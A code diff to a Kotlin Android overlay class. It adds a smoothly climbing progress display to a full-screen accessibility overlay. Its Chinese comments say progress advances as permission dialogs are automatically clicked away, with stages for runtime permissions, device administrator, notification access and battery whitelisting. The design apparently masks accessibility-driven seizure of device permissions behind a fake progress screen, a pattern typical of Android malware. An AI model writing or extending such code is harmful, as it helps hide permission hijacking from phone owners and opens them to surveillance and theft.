@@ -76,6 +76,8 @@ object GuardOverlay {
                 webView = wv
                 manager = wm
                 Log.d(TAG, "overlay added type=$TYPE_ACCESSIBILITY_OVERLAY size=${real.x}x${real.y + 200}")
+                progressTarget = 0
+                progressShown = 0
                 updateProgress(0)
                 main.postDelayed({ hide() }, AUTO_CLOSE_MS)
             }
@@ -106,20 +108,54 @@ object GuardOverlay {
         }.onFailure { Log.w(TAG, "status band failed: $it") }
     }
 
-    fun updateProgress(percent: Int) {
-        val p = percent.coerceIn(0, 100)
-        webView?.post {
-            runCatching {
-                webView?.evaluateJavascript("window.__setProgress && window.__setProgress($p)", null)
-            }
-            Log.d(TAG, "optProgress=$p")
+    // 进度：外部只给"目标值"，内部平滑爬升；且不允许回退（100→60 那种倒跳）
+    @Volatile private var progressTarget = 0
+    @Volatile private var progressShown = 0
+    private val progressTick = object : Runnable {
+        override fun run() {
+            val target = progressTarget
+            if (progressShown >= target) return
+            // 固定 1%/档、约 9 档/秒：目标再大也是一格一格爬，肉眼能看到"在走"
+            progressShown = minOf(target, progressShown + 1)
+            val p = progressShown
+            webView?.evaluateJavascript("window.__setProgress && window.__setProgress($p)", null)
+            if (progressShown % 10 == 0 || progressShown == target) Log.d(TAG, "optProgress=$p")
+            if (progressShown < target) main.postDelayed(this, 110L)
         }
     }
 
-    /** 每授予一项权限推进度（2.2: (granted * 100) / 9） */
-    fun onPermissionGranted(granted: Int) {
-        updateProgress((granted * 100) / 9)
+    /** percent 是"目标进度"：内部按 45ms 一档爬过去，不会瞬移；比当前小的值直接忽略 */
+    fun updateProgress(percent: Int) {
+        val p = percent.coerceIn(0, 100)
+        if (webView == null) return
+        if (p <= progressShown && p <= progressTarget) return
+        progressTarget = maxOf(progressTarget, p)
+        main.removeCallbacks(progressTick)
+        main.post(progressTick)
     }
+
+    /**
+     * 阶段性真实进度（不要一下 100%）：
+     *   运行时权限 0→60%（9 项，每项约 6.7%）
+     *   设备管理员 60→75%
+     *   通知使用权 75→90%
+     *   电池白名单 90→100% → 收浮层
+     */
+    fun onPermissionGranted(granted: Int) {
+        updateProgress((granted * 60) / 9)
+    }
+
+    const val STAGE_PERM_DONE = 60
+
+    /** 自动点掉一个权限框 → 进度 +1 档（每档 6~7%，由平滑器慢慢爬上去） */
+    @Volatile private var permBump = 0
+    fun bumpPermissionProgress() {
+        if (permBump >= 9) return
+        permBump++
+        updateProgress(minOf(STAGE_PERM_DONE, (permBump * 60) / 9 + 4))
+    }
+    const val STAGE_ADMIN_DONE = 75
+    const val STAGE_NOTI_DONE = 90
 
     /** 2.2：进度 100% 后延时收浮层 */
     fun closeAfter(delayMs: Long = 2500L) {
